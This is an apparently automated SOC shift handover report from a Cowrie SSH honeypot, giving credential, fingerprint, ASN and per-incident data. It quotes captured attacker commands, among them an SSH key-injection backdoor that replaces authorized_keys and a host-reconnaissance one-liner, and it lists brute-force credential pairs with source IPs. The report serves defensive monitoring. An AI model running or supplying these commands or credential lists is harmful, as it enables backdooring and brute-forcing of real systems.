# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-22 |
| **Generated At** | 2026-07-22T21:14:13Z |
| **Shift Time** | 21:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **180** |
| Confirmed Threats | **160** |
| False Positives Filtered | **20** (11.1%) |
| Unique Attacker IPs | **98** |
| Countries of Origin | **31** |
| High Severity Cases | **127** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **2** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **161** |
| Unique Credential Pairs | **87** |
| Unique Usernames | **21** |
| Unique Passwords | **55** |
| Successful Auth Pairs | **141** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `admin` | 19 |
| `operator` | 15 |
| `blank` | 14 |
| `debian` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456789` | 7 |
| `12345678` | 6 |
| `654321` | 6 |
| `password` | 6 |
| `operator2011` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `operator` | `operator2011` | 6 |
| `postgres` | `webmaster` | 6 |
| `operator` | `operator2021` | 5 |
| `root` | `LeitboGi0ro` | 5 |
| `blank` | `blank2023` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `123` | `92.118.39.49` | 2026-07-22T18:55:21 |
| `admin` | `123123` | `92.118.39.49` | 2026-07-22T18:57:21 |
| `root` | `1g2w3e4r` | `10.0.0.73` | 2026-07-22T18:57:51 |
| `root` | `1g2w3e4r` | `185.242.3.195` | 2026-07-22T18:59:08 |
| `admin` | `1234` | `92.118.39.49` | 2026-07-22T18:59:10 |
| `admin` | `12345` | `92.118.39.49` | 2026-07-22T19:01:00 |
| `admin` | `123456` | `92.118.39.49` | 2026-07-22T19:02:53 |
| `mysql` | `qwerty` | `65.20.138.3` | 2026-07-22T19:03:05 |
| `blank` | `000` | `101.13.4.119` | 2026-07-22T19:03:20 |
| `admin` | `1234567` | `92.118.39.49` | 2026-07-22T19:04:44 |
| `svn` | `svn` | `185.242.3.195` | 2026-07-22T19:06:26 |
| `admin` | `12345678` | `92.118.39.49` | 2026-07-22T19:06:33 |
| `blank` | `000` | `103.83.23.169` | 2026-07-22T19:06:43 |
| `mysql` | `qwerty` | `10.0.0.73` | 2026-07-22T19:06:43 |
| `root` | `ubuntu` | `115.190.155.5` | 2026-07-22T19:07:11 |
| `admin` | `123456789` | `92.118.39.49` | 2026-07-22T19:08:22 |
| `admin` | `1q2w3e4r` | `92.118.39.49` | 2026-07-22T19:10:16 |
| `support` | `support` | `176.53.159.196` | 2026-07-22T19:12:02 |
| `admin` | `654321` | `92.118.39.49` | 2026-07-22T19:12:05 |
| `root` | `feifei520` | `207.154.230.149` | 2026-07-22T19:12:12 |
| `345gs5662d34` | `345gs5662d34` | `207.154.230.149` | 2026-07-22T19:12:15 |
| `root` | `3245gs5662d34` | `207.154.230.149` | 2026-07-22T19:12:16 |
| `operator` | `operator2021` | `122.187.237.122` | 2026-07-22T19:13:15 |
| `support` | `support` | `10.0.0.73` | 2026-07-22T19:13:20 |
| `admin` | `Admin123` | `92.118.39.49` | 2026-07-22T19:13:50 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-22T19:14:37 |
| `blank` | `6666666` | `42.248.129.234` | 2026-07-22T19:15:07 |
| `blank` | `6666666` | `124.67.120.106` | 2026-07-22T19:15:16 |
| `blank` | `6666666` | `10.0.0.73` | 2026-07-22T19:15:36 |
| `admin` | `P@ssw0rd` | `92.118.39.49` | 2026-07-22T19:15:37 |
| `operator` | `operator2021` | `122.176.21.104` | 2026-07-22T19:16:31 |
| `operator` | `operator2021` | `175.43.184.241` | 2026-07-22T19:16:45 |
| `admin` | `admin` | `146.190.83.66` | 2026-07-22T19:16:54 |
| `operator` | `operator2021` | `10.0.0.73` | 2026-07-22T19:16:54 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-22T19:16:54 |
| `admin` | `admin` | `92.118.39.49` | 2026-07-22T19:17:27 |
| `admin` | `passw0rd` | `92.118.39.49` | 2026-07-22T19:19:17 |
| `admin` | `password` | `92.118.39.49` | 2026-07-22T19:21:12 |
| `admin` | `password1` | `92.118.39.49` | 2026-07-22T19:23:03 |
| `admin` | `qwerty` | `92.118.39.49` | 2026-07-22T19:24:49 |
| `admin1` | `123123` | `92.118.39.49` | 2026-07-22T19:26:34 |
| `blank` | `1111111` | `60.223.251.132` | 2026-07-22T19:27:24 |
| `support` | `88` | `220.246.41.171` | 2026-07-22T19:27:46 |
| `admin1` | `12345` | `92.118.39.49` | 2026-07-22T19:28:17 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-22T19:28:30 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-22T19:28:30 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-22T19:28:39 |
| `admin1` | `123456` | `92.118.39.49` | 2026-07-22T19:30:00 |
| `blank` | `1111111` | `187.126.105.42` | 2026-07-22T19:30:39 |
| `blank` | `1111111` | `10.0.0.73` | 2026-07-22T19:31:03 |
| `admin1` | `password` | `92.118.39.49` | 2026-07-22T19:31:42 |
| `administrator` | `123123` | `92.118.39.49` | 2026-07-22T19:33:26 |
| `administrator` | `12345` | `92.118.39.49` | 2026-07-22T19:35:13 |
| `operator` | `123456789` | `213.154.80.51` | 2026-07-22T19:36:32 |
| `administrator` | `123456` | `92.118.39.49` | 2026-07-22T19:37:01 |
| `administrator` | `1234567` | `92.118.39.49` | 2026-07-22T19:38:49 |
| `operator` | `123456789` | `101.13.5.26` | 2026-07-22T19:39:38 |
| `operator` | `123456789` | `208.96.233.67` | 2026-07-22T19:39:45 |
| `operator` | `123456789` | `10.0.0.73` | 2026-07-22T19:40:00 |
| `supervisor` | `supervisor2023` | `10.0.0.73` | 2026-07-22T19:40:02 |
| `administrator` | `12345678` | `92.118.39.49` | 2026-07-22T19:40:33 |
| `administrator` | `123456789` | `92.118.39.49` | 2026-07-22T19:42:18 |
| `administrator` | `password` | `92.118.39.49` | 2026-07-22T19:43:58 |
| `apache` | `12345678` | `92.118.39.49` | 2026-07-22T19:45:40 |
| `apache` | `password` | `92.118.39.49` | 2026-07-22T19:47:28 |
| `backup` | `123` | `92.118.39.49` | 2026-07-22T19:49:18 |
| `svn` | `svn` | `10.0.0.73` | 2026-07-22T19:49:31 |
| `backup` | `12345678` | `92.118.39.49` | 2026-07-22T19:51:05 |
| `operator` | `operator2011` | `213.230.64.246` | 2026-07-22T19:52:01 |
| `operator` | `operator2011` | `91.144.158.62` | 2026-07-22T19:52:07 |
| `backup` | `backup` | `92.118.39.49` | 2026-07-22T19:52:56 |
| `backup` | `backup123` | `92.118.39.49` | 2026-07-22T19:54:50 |
| `oracle` | `P@ssword` | `14.54.22.11` | 2026-07-22T19:55:14 |
| `oracle` | `P@ssword` | `62.182.132.94` | 2026-07-22T19:55:25 |
| `operator` | `operator2011` | `177.72.87.7` | 2026-07-22T19:55:25 |
| `operator` | `operator2011` | `124.88.174.143` | 2026-07-22T19:55:34 |
| `oracle` | `P@ssword` | `10.0.0.73` | 2026-07-22T19:55:40 |
| `operator` | `operator2011` | `10.0.0.73` | 2026-07-22T19:55:47 |
| `backup` | `password` | `92.118.39.49` | 2026-07-22T19:56:42 |
| `root` | `P@ss!@#` | `185.242.3.195` | 2026-07-22T19:58:09 |
| `centos` | `12345678` | `92.118.39.49` | 2026-07-22T19:58:34 |
| `blank` | `blank2023` | `106.112.194.160` | 2026-07-22T19:59:30 |
| `centos` | `654321` | `92.118.39.49` | 2026-07-22T20:00:28 |
| `centos` | `centos` | `92.118.39.49` | 2026-07-22T20:02:19 |
| `blank` | `blank2023` | `93.177.157.179` | 2026-07-22T20:02:42 |
| `blank` | `blank2023` | `36.64.211.93` | 2026-07-22T20:02:54 |
| `blank` | `blank2023` | `10.0.0.73` | 2026-07-22T20:03:04 |
| `centos` | `centos123` | `92.118.39.49` | 2026-07-22T20:04:07 |
| `support` | `00000` | `10.0.0.73` | 2026-07-22T20:04:20 |
| `dzq` | `dzq` | `188.66.127.172` | 2026-07-22T20:04:24 |
| `345gs5662d34` | `345gs5662d34` | `188.66.127.172` | 2026-07-22T20:04:26 |
| `dzq` | `3245gs5662d34` | `188.66.127.172` | 2026-07-22T20:04:27 |
| `debian` | `111111` | `92.118.39.49` | 2026-07-22T20:05:51 |
| `debian` | `123123` | `92.118.39.49` | 2026-07-22T20:07:34 |
| `debian` | `12345` | `92.118.39.49` | 2026-07-22T20:09:15 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-22T20:10:08 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-22T20:10:09 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-22T20:10:13 |
| `debian` | `123456` | `92.118.39.49` | 2026-07-22T20:10:58 |
| `debian` | `12345678` | `92.118.39.49` | 2026-07-22T20:12:41 |
| `debian` | `123456789` | `92.118.39.49` | 2026-07-22T20:14:22 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-22T20:14:23 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-22T20:14:23 |
| `debian` | `password` | `92.118.39.49` | 2026-07-22T20:16:00 |
| `support` | `55555` | `111.70.32.53` | 2026-07-22T20:16:16 |
| `support` | `55555` | `117.211.15.106` | 2026-07-22T20:16:26 |
| `test` | `test000` | `220.122.115.9` | 2026-07-22T20:16:28 |
| `test` | `test000` | `49.124.149.53` | 2026-07-22T20:16:44 |
| `debian` | `qwerty` | `92.118.39.49` | 2026-07-22T20:17:41 |
| `deploy` | `111111` | `92.118.39.49` | 2026-07-22T20:19:22 |
| `support` | `55555` | `10.0.0.73` | 2026-07-22T20:19:52 |
| `test` | `test000` | `177.174.0.3` | 2026-07-22T20:19:52 |
| `test` | `test000` | `173.181.131.247` | 2026-07-22T20:20:04 |
| `deploy` | `123123` | `92.118.39.49` | 2026-07-22T20:21:04 |
| `supervisor` | `654321` | `62.201.253.23` | 2026-07-22T20:22:35 |
| `supervisor` | `supervisor2014` | `111.70.23.253` | 2026-07-22T20:24:59 |
| `supervisor` | `supervisor2014` | `60.212.0.13` | 2026-07-22T20:25:13 |
| `supervisor` | `654321` | `106.89.50.210` | 2026-07-22T20:25:46 |
| `supervisor` | `654321` | `10.0.0.73` | 2026-07-22T20:26:06 |
| `supervisor` | `supervisor2014` | `189.52.52.162` | 2026-07-22T20:28:19 |
| `supervisor` | `supervisor2014` | `218.202.91.147` | 2026-07-22T20:28:28 |
| `supervisor` | `supervisor2014` | `10.0.0.73` | 2026-07-22T20:28:46 |
| `root` | `debian` | `219.153.106.29` | 2026-07-22T20:31:17 |
| `administrator` | `121212` | `60.223.251.132` | 2026-07-22T20:40:29 |
| `administrator` | `121212` | `185.112.148.66` | 2026-07-22T20:40:38 |
| `postgres` | `webmaster` | `128.185.12.179` | 2026-07-22T20:40:54 |
| `postgres` | `webmaster` | `111.53.131.79` | 2026-07-22T20:41:08 |
| `root` | `P@ss!@#` | `10.0.0.73` | 2026-07-22T20:41:35 |
| `administrator` | `121212` | `101.13.1.58` | 2026-07-22T20:43:53 |
| `postgres` | `webmaster` | `70.91.135.181` | 2026-07-22T20:44:00 |
| `postgres` | `webmaster` | `46.210.94.61` | 2026-07-22T20:44:12 |
| `administrator` | `121212` | `10.0.0.73` | 2026-07-22T20:44:15 |
| `postgres` | `webmaster` | `10.0.0.73` | 2026-07-22T20:44:23 |
| `debian` | `debian2024` | `211.247.127.250` | 2026-07-22T20:45:34 |
| `debian` | `debian2024` | `119.152.102.54` | 2026-07-22T20:48:45 |
| `debian` | `debian2024` | `10.0.0.73` | 2026-07-22T20:48:55 |
| `pc` | `pc` | `167.86.114.220` | 2026-07-22T20:49:09 |
| `345gs5662d34` | `345gs5662d34` | `167.86.114.220` | 2026-07-22T20:49:12 |
| `pc` | `3245gs5662d34` | `167.86.114.220` | 2026-07-22T20:49:12 |
| `root` | `qwe123..` | `185.242.3.195` | 2026-07-22T20:50:16 |
| `root` | `66666` | `218.21.243.58` | 2026-07-22T20:52:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **180** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 60 |
| OpenSSH | 46 |
| libssh | 16 |
| Paramiko (Python) | 12 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 49 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 46 | 45 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `16443846184e...` | Generic scanner | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 49 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 46 | 45 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 2 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 49 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `167.86.114.220`, `207.154.230.149`, `188.66.127.172`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **98** |
| Unique ASNs | **62** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS24158` | Taiwan Mobile Co., Ltd. | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (127)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ca1ceef2614c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 18:55 |
| **Last Seen** | 2026-07-22 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 18:55:20` | `cowrie.session.connect` |
| `2026-07-22 18:55:20` | `cowrie.client.version` |
| `2026-07-22 18:55:20` | `cowrie.client.kex` |
| `2026-07-22 18:55:21` | `cowrie.login.success` |
| `2026-07-22 18:55:22` | `cowrie.session.params` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.success` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.command.input` |
| `2026-07-22 18:55:22` | `cowrie.log.closed` |
| `2026-07-22 18:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a52456e2c0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 18:57 |
| **Last Seen** | 2026-07-22 18:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 18:57:19` | `cowrie.session.connect` |
| `2026-07-22 18:57:20` | `cowrie.client.version` |
| `2026-07-22 18:57:20` | `cowrie.client.kex` |
| `2026-07-22 18:57:21` | `cowrie.login.success` |
| `2026-07-22 18:57:22` | `cowrie.session.params` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.success` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:22` | `cowrie.command.input` |
| `2026-07-22 18:57:23` | `cowrie.log.closed` |
| `2026-07-22 18:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933dcc7cb277

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 18:59 |
| **Last Seen** | 2026-07-22 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 18:59:08` | `cowrie.session.connect` |
| `2026-07-22 18:59:08` | `cowrie.client.version` |
| `2026-07-22 18:59:08` | `cowrie.client.kex` |
| `2026-07-22 18:59:08` | `cowrie.login.success` |
| `2026-07-22 18:59:09` | `cowrie.session.params` |
| `2026-07-22 18:59:09` | `cowrie.command.input` |
| `2026-07-22 18:59:09` | `cowrie.log.closed` |
| `2026-07-22 18:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b459dab38483

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 18:59 |
| **Last Seen** | 2026-07-22 18:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 18:59:09` | `cowrie.session.connect` |
| `2026-07-22 18:59:09` | `cowrie.client.version` |
| `2026-07-22 18:59:10` | `cowrie.client.kex` |
| `2026-07-22 18:59:10` | `cowrie.login.success` |
| `2026-07-22 18:59:11` | `cowrie.session.params` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.success` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:11` | `cowrie.command.input` |
| `2026-07-22 18:59:12` | `cowrie.log.closed` |
| `2026-07-22 18:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440047d62012

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:00 |
| **Last Seen** | 2026-07-22 19:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:00:59` | `cowrie.session.connect` |
| `2026-07-22 19:00:59` | `cowrie.client.version` |
| `2026-07-22 19:01:00` | `cowrie.client.kex` |
| `2026-07-22 19:01:00` | `cowrie.login.success` |
| `2026-07-22 19:01:01` | `cowrie.session.params` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.success` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.command.input` |
| `2026-07-22 19:01:01` | `cowrie.log.closed` |
| `2026-07-22 19:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77ccd90f4b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:02 |
| **Last Seen** | 2026-07-22 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:02:52` | `cowrie.session.connect` |
